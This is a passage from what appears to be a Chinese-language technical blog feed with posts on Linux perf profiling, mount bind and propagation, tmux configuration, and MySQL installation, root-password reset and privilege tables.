<h3 id="概要分析数据"><a href="#概要分析数据" class="headerlink" title="概要分析数据"></a>概要分析数据</h3><p>使用<code>perf top</code>和<code>perf stat</code>进行该要分析系统性能，<code>perf top</code>类似于linux的<code>top</code>命令，按进程显示分析数据，可以使用<code>-e</code>参数指定分析事件，通过<code>perf top</code>找出系统中的问题进程。（更多关于<code>perf top</code>的使用精请见<code>perf top -h</code>）</p>
<p><code>perf stat</code>用于汇总综合性能，有人用此方法比较性能改善前后的结果。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Performance counter stats for &#x27;ls /&#x27;:</span><br><span class="line"></span><br><span class="line">         0.827614      task-clock (msec)         #    0.707 CPUs utilized</span><br><span class="line">                0      context-switches          #    0.000 K/sec</span><br><span class="line">                0      cpu-migrations            #    0.000 K/sec</span><br><span class="line">               91      page-faults               #    0.110 M/sec</span><br><span class="line">  &lt;not supported&gt;      cycles</span><br><span class="line">  &lt;not supported&gt;      stalled-cycles-frontend</span><br><span class="line">  &lt;not supported&gt;      stalled-cycles-backend</span><br><span class="line">  &lt;not supported&gt;      instructions</span><br><span class="line">  &lt;not supported&gt;      branches</span><br><span class="line">  &lt;not supported&gt;      branch-misses</span><br><span class="line"></span><br><span class="line">      0.001169835 seconds time elapsed</span><br></pre></td></tr></table></figure>
<p>(由于我使用的是VM，所有有很多不支持的)</p>
<ul>
<li>task clock<br>  进程执行所花费的时间，CPU 利用率，该值高，说明程序的多数时间花费在 CPU 计算上而非 IO。</li>
<li>context switches<br>  进程切换次数，记录了程序运行过程中发生了多少次进程切换，频繁的进程切换是应该避免的。</li>
<li>cpu migrations<br>  进程运行过程中发生了多少次 CPU 迁移，即被调度器从一个 CPU 转移到另外一个 CPU 上运行。</li>
<li>page faults<br>  按需分页或交换等过程中使用的页面错误的发生次数和频率</li>
<li>cycles<br>  处理器时钟，一条机器指令可能需要多个 cycles</li>
<li>instructions<br>  机器指令数目</li>
<li>branches<br>  分支命令的数量和频率</li>
<li>branch misses<br>  分支预测错误的比例</li>
</ul>
<h3 id="分析记录的数据"><a href="#分析记录的数据" class="headerlink" title="分析记录的数据"></a>分析记录的数据</h3><h4 id="记录并保存分析数据"><a href="#记录并保存分析数据" class="headerlink" title="记录并保存分析数据"></a>记录并保存分析数据</h4><p>通过<code>perf record</code>命令实现将分析数据保存到<code>perf.data</code>（默认）文件中，虽然<code>perf top</code>也能获取分析数据，但是<code>perf top</code>每隔2秒（默认）更新一次，而且对于一些特殊case不好抓取。<code>perf record</code>特别适合针对某个进程某个事件的分析非常好用。具体使用方法可以参考<code>perf record -h</code></p>
<h4 id="查看保存的分析数据"><a href="#查看保存的分析数据" class="headerlink" title="查看保存的分析数据"></a>查看保存的分析数据</h4><p>通过<code>perf report</code>查看<code>perf.data</code>（默认），<code>perf report</code>分析内容的查看与<code>perf top</code>的查看方式相同。</p>
<h2 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h2><h3 id="perf-script"><a href="#perf-script" class="headerlink" title="perf script"></a>perf script</h3><p>一般情况下，我们可以通过<code>perf record</code>＋<code>-e</code>指定追踪事件方式来获取进程相关事件分析数据(<code>perf.data</code>)，然后通过<code>perf script</code>(不加任何脚本情况下)只显示记录到的追踪事件数据。若<code>perf script</code>后指定脚本，那么会将记录到的追踪事件数据作为输入，传递给指定的脚本处理。</p>
<p>perf脚本处理数据分为在线处理和离线处理；</p>
<ul>
<li>在线处理<br>  在进行追踪的同时运行脚本，则不可避免地会增加负载<br>  eg: <code>perf script sctop</code> 统计系统调用次数</li>
<li>离线处理<br>  进行离线处理时先追踪后处理，可以抑制处理对追踪对象的影响<br>  eg: <code>perf script record syscall-counts ls /</code> 先追踪，后处理；<code>perf script report syscall-counts</code> 查看统计系统调用次数结果</li>
</ul>
<p>** 自定义脚本 **</p>
<p>用户可根据自己的需求编写自己的Python或Perl脚本处理追踪事件数据，二者分别需要安装libpython或libperl，并且需要重新build perf。</p>
<p>过程：</p>
<ul>
<li>先记录必要事件的数据文件<br>  使用<code>perf record</code>记录执行<code>ls /</code>过程中内存分配kmalloc()的相关事件数据<br>  eg: <code>perf record -e kmem:kmalloc -e raw_syscalls:sys_enter ls /</code></li>
<li>生成自定义脚本<br>  使用<code>perf script -g perl</code>(perl脚本) or <code>perf script -g python</code>(python脚本)生成自定义脚本，根据需要修改生成的脚本内容</li>
<li>执行自定义脚本<br>  使用<code>perf script</code>+<code>-s</code>参数指定用户自定义的脚本执行追踪处理</li>
</ul>
<h2 id="姿势三"><a href="#姿势三" class="headerlink" title="姿势三"></a>姿势三</h2><p>Todo…</p>
<h1 id="收"><a href="#收" class="headerlink" title="收"></a>收</h1><p>perf tools这把瑞士军刀可以说功能齐全威力惊人，但能将其发挥几层还要看使用者的功力如何。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.cnblogs.com/chenfulin5/p/8394973.html">ubuntu apt-get 安装指定版本软件</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-perf1/">Perf – Linux下的系统性能调优工具，第 1 部分</a></li>
<li><a href="https://www.cnblogs.com/arnoldlu/p/6241297.html">系统级性能分析工具perf的介绍与使用</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>perf</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>mount更多用法</title>
    <url>/2017/01/24/linux/mount-usage/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>每一个使用linux或类unix系统的人都会用到的命令mount，它用来挂载／卸载文件系统。这是该命令基本功能，除了基本功能该命令还有其它功能。</p>
<h1 id="更多多多多多多多多多多多多多多多用法"><a href="#更多多多多多多多多多多多多多多多用法" class="headerlink" title="更多多多多多多多多多多多多多多多用法"></a>更多多多多多多多多多多多多多多多用法</h1><h2 id="绑定挂载-bind-mount"><a href="#绑定挂载-bind-mount" class="headerlink" title="绑定挂载(bind mount)"></a>绑定挂载(bind mount)</h2><p>windows的快捷方式、linux的软硬链接，相信你已很熟悉了，下面我来说说mount的绑定挂载<code>--bind</code>。</p>
<p>linux的软硬链接原理:<br><img src="/images/linux/soft_hard_link.jpg" alt="原理图"></p>
<ul>
<li>软连接受应用程序影响，不是所有应用程序都能通过软连接访问资源的</li>
<li>硬链接只能作用在文件上，不能为文件夹创建硬链接</li>
</ul>
<p>bind mount:<br>能成功克服软硬链接的缺点，将文件或文件夹挂载到指定的挂载点上。使对挂载点的操作转移到文件或文件夹上。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"> # </span><span class="language-bash"><span class="built_in">ls</span> -li uts*</span></span><br><span class="line">583819234 -rw-r--r--. 1 root root 4 1月  23 16:55 uts</span><br><span class="line">606248334 -rw-r--r--. 1 root root 2 1月  23 10:44 uts2</span><br><span class="line"><span class="meta prompt_"> # </span><span class="language-bash">mount --<span class="built_in">bind</span> ./uts2 ./uts</span></span><br><span class="line"><span class="meta prompt_"> # </span><span class="language-bash"><span class="built_in">ls</span> -li uts*</span></span><br><span class="line">606248334 -rw-r--r--. 1 root root 2 1月  23 10:44 uts</span><br><span class="line">606248334 -rw-r--r--. 1 root root 2 1月  23 10:44 uts2</span><br></pre></td></tr></table></figure>
<p>uts的inode变成了，uts2的inode id，所有访问uts的io都会转移到uts2上；并且在mount中能查看到<code>bind mount</code>信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"> # </span><span class="language-bash">mount</span></span><br><span class="line">...</span><br><span class="line">/dev/mapper/rhel_rhel82-root on /home/zhoub/uts type xfs (rw,relatime,seclabel,attr2,inode64,noquota)</span><br></pre></td></tr></table></figure>
<p><code>bind mount</code>是用挂载文件或目录信息遮盖了挂载的文件或目录，当不需要时，可以通过<code>umount</code>卸载，恢复原文件或目录的信息。</p>
<h2 id="挂载传播-mount-propagation"><a href="#挂载传播-mount-propagation" class="headerlink" title="挂载传播(mount propagation)"></a>挂载传播(mount propagation)</h2><p>执行<code>clone()</code>时，进程拷贝当前文件系统树，此后，新进程就拥有与原进程相同的文件系统树拷贝，两个文件系统树中的任何挂载操作都不会影响另一个拷贝。尽管每个进程使用单独的文件系统名称空间在理论上非常有意义，但完全隔离也会造成较大限制性。进程克隆了系统的文件系统名称空间之后，已经运行的系统守护进程无法为这个用户自动挂载 CD-ROM，因为在原文件系统名称空间中执行的挂载无法影响用户的拷贝。2006 年引入的挂载传播（mount propagation）解决了这个问题，挂载传播定义了挂载对象之间的关系。</p>
<ul>
<li>共享挂载(share mount)<br>  如果两个挂载对象具有共享关系，那么一个挂载对象中的挂载事件会传播到另一个挂载对象，反之亦然<br>  <code>mount --make-shared &lt;mount-object&gt;</code><br>  <code>mount --make-rshared &lt;mount-object&gt;</code></li>
<li>从属挂载(slave mount)<br>  如果两个挂载对象形成从属（slave）关系，那么一个挂载对象中的挂载事件会传播到另一个挂载对象，但是反过来不行；在这种关系中，从属对象是事件的接收者<br>  <code>mount --make-slave &lt;mount-object&gt;</code></li>
<li>私有挂载(private mount)<br>  既不传播也不接收挂载事件<br>  <code>mount --make-private &lt;mount-object&gt;</code></li>
<li>不可绑定挂载(unbindable mount)<br>  与私有挂载相似，但是不允许执行绑定挂载<br>  <code>mount --make-unbindable &lt;mount-object&gt;</code></li>
</ul>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://blog.csdn.net/shengxia1999/article/details/52060354">mount –bind和硬连接的区别</a></li>
<li><a href="http://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/">理解 Linux 的硬链接与软链接</a></li>
<li><a href="http://www.ibm.com/developerworks/cn/linux/l-mount-namespaces.html">应用挂载名称空间</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>mount</tag>
      </tags>
  </entry>
  <entry>
    <title>RHEL7.2下MySQL-python安装</title>
    <url>/2016/08/10/mysql/20160810-mysql-python-install-on-rhel7-2/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>使用python2.7</p>
<h1 id="依赖库"><a href="#依赖库" class="headerlink" title="依赖库"></a>依赖库</h1><ul>
<li><p>gcc<br>需要安装<code>gcc</code>编译器，用于编译<code>_mysql.c</code></p>
</li>
<li><p>python<br>安装<code>python-devel</code>解决找不到“Python.h”问题</p>
</li>
<li><p>mysql<br>安装 mysql-community-devel</p>
</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>mysql</tag>
        <tag>rhel</tag>
      </tags>
  </entry>
  <entry>
    <title>tmux 配置</title>
    <url>/2016/04/14/linux/tmux-config-md/</url>
    <content><![CDATA[<h2 id="tmux-配置如下-tmux-conf-："><a href="#tmux-配置如下-tmux-conf-：" class="headerlink" title="tmux 配置如下(~&#x2F;.tmux.conf)："></a>tmux 配置如下(~&#x2F;.tmux.conf)：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">状态栏</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">颜色</span></span><br><span class="line">set -g status-bg black</span><br><span class="line">set -g status-fg white</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">对齐</span></span><br><span class="line">set-option -g status-justify centre</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">左下角</span></span><br><span class="line">set-option -g status-left &#x27;#[bg=black,fg=green][#[fg=cyan]#S#[fg=green]]&#x27;</span><br><span class="line">set-option -g status-left-length 20</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">窗口列表</span></span><br><span class="line">set -g automatic-rename on</span><br><span class="line">set-window-option -g window-status-format &#x27;#[dim]#I:#[default]#W#[fg=grey,dim]&#x27;</span><br><span class="line">set-window-option -g window-status-current-format &#x27;#[fg=cyan,bold]#I:#W#[fg=blue]&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">右下角</span></span><br><span class="line">set -g status-right &#x27;#[fg=green][#[fg=cyan]%Y-%m-%d#[fg=green]]&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制模式</span></span><br><span class="line">set-window-option -g utf8 on</span><br><span class="line">set-window-option -g mode-keys vi</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>config</tag>
        <tag>tmux</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL环境配置搭建</title>
    <url>/2016/08/10/mysql/20160810-mysql-deploy-on-rhel7-2/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h2 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h2><p>RHEL7.2</p>
<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="1、安装mysql，详细见mysql官网"><a href="#1、安装mysql，详细见mysql官网" class="headerlink" title="1、安装mysql，详细见mysql官网"></a>1、安装mysql，详细见mysql官网</h2><h2 id="2、启动mysql-service"><a href="#2、启动mysql-service" class="headerlink" title="2、启动mysql service"></a>2、启动mysql service</h2><p>rhel7.2中，使用service mysqld start启动mysql服务。【status：查服务状态；stop：停止服务；restart：重启服务】</p>
<h2 id="3、修改root密码"><a href="#3、修改root密码" class="headerlink" title="3、修改root密码"></a>3、修改root密码</h2><ul>
<li><p>首先使客户端登陆掉过密码检测，然后重启mysql服务<br><code>echo &quot;skip-grant-tables&quot; &gt;&gt; /etc/my.cnf</code></p>
</li>
<li><p>使用<code>mysql -uroot -p</code>登陆，然后修改<code>mysql</code>库中的<code>user</code>表<br><code>update user set password_expired=&quot;N&quot; where user=&quot;root&quot;;</code><br><code>update user set authentication_string=password(&quot;hnagroup&quot;) where user=&quot;root&quot;;</code></p>
</li>
<li><p>最后删除<code>/etc/my.cnf</code>中的<code>skip-grant-tables</code>，去掉客户端跳过密码检测设置</p>
</li>
</ul>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>rhel</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 权限管理</title>
    <url>/2016/09/23/mysql/mysql-priv-mng-md/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><ul>
<li>OS Version : rhel 6.4</li>
<li>MySQL Version : 5.6.31</li>
</ul>
<h1 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h1><h2 id="权限列表"><a href="#权限列表" class="headerlink" title="权限列表"></a>权限列表</h2><table>
<thead>
<tr>
<th align="left">Privilege</th>
<th align="left">Column</th>
<th align="left">Context</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CREATE</td>
<td align="left">Create_priv</td>
<td align="left">databases, tables, or indexes</td>
</tr>
<tr>
<td align="left">DROP</td>
<td align="left">Drop_priv</td>
<td align="left">database, tables, or views</td>
</tr>
<tr>
<td align="left">GRANT OPTION</td>
<td align="left">Grant_priv</td>
<td align="left">database, tables, or stored routines</td>
</tr>
<tr>
<td align="left">LOCK TABLES</td>
<td align="left">lock_tables_priv</td>
<td align="left">databases</td>
</tr>
<tr>
<td align="left">REFERENCES</td>
<td align="left">References_priv</td>
<td align="left">databases or tables, columns</td>
</tr>
<tr>
<td align="left">EVENT</td>
<td align="left">Event_priv</td>
<td align="left">databases</td>
</tr>
<tr>
<td align="left">ALTER</td>
<td align="left">Alter_priv</td>
<td align="left">tables</td>
</tr>
<tr>
<td align="left">DELETE</td>
<td align="left">Delete_priv</td>
<td align="left">tables</td>
</tr>
<tr>
<td align="left">INDEX</td>
<td align="left">Index_priv</td>
<td align="left">tables</td>
</tr>
<tr>
<td align="left">INSERT</td>
<td align="left">Insert_priv</td>
<td align="left">tables or columns</td>
</tr>
<tr>
<td align="left">SELECT</td>
<td align="left">Select_priv</td>
<td align="left">tables or columns</td>
</tr>
<tr>
<td align="left">UPDATE</td>
<td align="left">Update_priv</td>
<td align="left">tables or columns</td>
</tr>
<tr>
<td align="left">CREATE TEMPORARY TABLES</td>
<td align="left">Create_tmp_table_priv</td>
<td align="left">tables</td>
</tr>
<tr>
<td align="left">TRIGGER</td>
<td align="left">trigger_priv</td>
<td align="left">tables</td>
</tr>
<tr>
<td align="left">CREATE VIEW</td>
<td align="left">Create_view_priv</td>
<td align="left">views</td>
</tr>
<tr>
<td align="left">SHOW VIEW</td>
<td align="left">Show_view_priv</td>
<td align="left">views</td>
</tr>
<tr>
<td align="left">ALTER ROUTINE</td>
<td align="left">alter_routine_priv</td>
<td align="left">stored routines</td>
</tr>
<tr>
<td align="left">CREATE ROUTINE</td>
<td align="left">create_routine_priv</td>
<td align="left">stored routines</td>
</tr>
<tr>
<td align="left">EXECUTE</td>
<td align="left">execute_priv</td>
<td align="left">stored routines</td>
</tr>
<tr>
<td align="left">FILE</td>
<td align="left">file_priv</td>
<td align="left">file access on server host (Global)</td>
</tr>
<tr>
<td align="left">CREATE TABLESPACE</td>
<td align="left">create_tablespace_priv</td>
<td align="left">server administration (Global)</td>
</tr>
<tr>
<td align="left">CREATE USER</td>
<td align="left">create_user_priv</td>
<td align="left">server administration (Global)</td>
</tr>
<tr>
<td align="left">PROCESS</td>
<td align="left">process_priv</td>
<td align="left">server administration (Global)</td>
</tr>
<tr>
<td align="left">PROXY</td>
<td align="left">proxy_priv</td>
<td align="left">server administration (user to user)</td>
</tr>
<tr>
<td align="left">RELOAD</td>
<td align="left">reload_priv</td>
<td align="left">server administration (Global)</td>
</tr>
<tr>
<td align="left">REPLICATION CLIENT</td>
<td align="left">repl_client_priv</td>
<td align="left">server administration (Global)</td>
</tr>
<tr>
<td align="left">REPLICATION SLAVE</td>
<td align="left">repl_slave_priv</td>
<td align="left">server administration (Global)</td>
</tr>
<tr>
<td align="left">SHOW DATABASES</td>
<td align="left">show_db_priv</td>
<td align="left">server administration (Global)</td>
</tr>
<tr>
<td align="left">SHUTDOWN</td>
<td align="left">shutdown_priv</td>
<td align="left">server administration (Global)</td>
</tr>
<tr>
<td align="left">SUPER</td>
<td align="left">super_priv</td>
<td align="left">server administration (Global)</td>
</tr>
<tr>
<td align="left">ALL [PRIVILEGES]</td>
<td align="left"></td>
<td align="left">server administration</td>
</tr>
<tr>
<td align="left">USAGE</td>
<td align="left"></td>
<td align="left">server administration</td>
</tr>
</tbody></table>
<h2 id="按权限的种类分类"><a href="#按权限的种类分类" class="headerlink" title="按权限的种类分类"></a>按权限的种类分类</h2><ul>
<li>数据访问相关权限</li>
<li>库表结构相关权限</li>
<li>服务相关权限</li>
</ul>
<h1 id="权限相关表单"><a href="#权限相关表单" class="headerlink" title="权限相关表单"></a>权限相关表单</h1><p>MySQL权限信息存储在“mysql”数据中<br>其中:</p>
<ul>
<li>“user”表负责存储用户信息，及用户本身所拥有的权限；</li>
<li>“db”表负责存储用户与db的权限关系;</li>
<li>“tables_priv”负责存在用户与table的权限关系;</li>
<li>“columns_priv”负责存储用户与column的权限关系;</li>
</ul>
<h2 id="user表结构"><a href="#user表结构" class="headerlink" title="user表结构"></a>user表结构</h2><table>
<thead>
<tr>
<th align="left">Field</th>
<th align="left">Type</th>
<th align="center">Null</th>
<th align="center">Key</th>
<th align="left">Default</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Host</td>
<td align="left">char(60)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">User</td>
<td align="left">char(16)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Password</td>
<td align="left">char(41)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Select_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Insert_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Update_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Delete_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Create_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Drop_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Reload_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Shutdown_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Process_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">File_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Grant_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">References_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Index_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Alter_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Show_db_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Super_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Create_tmp_table_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Lock_tables_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Execute_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Repl_slave_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Repl_client_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Create_view_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Show_view_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Create_routine_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Alter_routine_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Create_user_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Event_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Trigger_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Create_tablespace_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">ssl_type</td>
<td align="left">enum(‘’,’ANY’,’X509’,’SPECIFIED’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">ssl_cipher</td>
<td align="left">blob</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">NULL</td>
</tr>
<tr>
<td align="left">x509_issuer</td>
<td align="left">blob</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">NULL</td>
</tr>
<tr>
<td align="left">x509_subject</td>
<td align="left">blob</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">NULL</td>
</tr>
<tr>
<td align="left">max_questions</td>
<td align="left">int(11) unsigned</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">max_updates</td>
<td align="left">int(11) unsigned</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">max_connections</td>
<td align="left">int(11) unsigned</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">max_user_connections</td>
<td align="left">int(11) unsigned</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">plugin</td>
<td align="left">char(64)</td>
<td align="center">YES</td>
<td align="center"></td>
<td align="left">mysql_native_password</td>
</tr>
<tr>
<td align="left">authentication_string</td>
<td align="left">text</td>
<td align="center">YES</td>
<td align="center"></td>
<td align="left">NULL</td>
</tr>
<tr>
<td align="left">password_expired</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
</tbody></table>
<h2 id="db表结构"><a href="#db表结构" class="headerlink" title="db表结构"></a>db表结构</h2><table>
<thead>
<tr>
<th align="left">Field</th>
<th align="left">Type</th>
<th align="center">Null</th>
<th align="center">Key</th>
<th align="left">Default</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Host</td>
<td align="left">char(60)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Db</td>
<td align="left">char(64)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">User</td>
<td align="left">char(16)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Select_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Insert_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Update_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Delete_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Create_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Drop_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Grant_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">References_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Index_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Alter_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Create_tmp_table_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Lock_tables_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Create_view_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Show_view_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Create_routine_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
